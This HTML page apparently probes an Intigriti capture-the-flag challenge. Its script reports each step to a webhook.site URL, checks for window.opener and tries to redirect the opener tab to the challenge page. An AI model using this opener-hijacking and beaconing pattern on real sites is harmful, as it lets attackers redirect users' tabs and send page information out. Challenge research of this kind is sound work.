<!doctype html>
<html>
<body>
<script>
const hook = 'https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c';
const id = Math.random().toString(36).slice(2);

function ping(q) {
  fetch(hook + q + '&id=' + id, { mode: 'no-cors' });
}

ping('?step=loaded');

ping('&step=opener_exists=' + (!!window.opener));

try {
  if (window.opener) {
    ping('&step=opener_closed=' + window.opener.closed);
  }
} catch (e) {
  ping('&step=opener_closed_err=' + encodeURIComponent(String(e)));
}

try {
  if (window.opener) {
    window.opener.location = 'https://challenge-0326.intigriti.io/challenge.html?from=opener_probe';
    ping('&step=opener_nav_attempted=true');
  }
} catch (e) {
  ping('&step=opener_nav_err=' + encodeURIComponent(String(e)));
}

setTimeout(() => {
  ping('&step=done');
}, 1500);
</script>
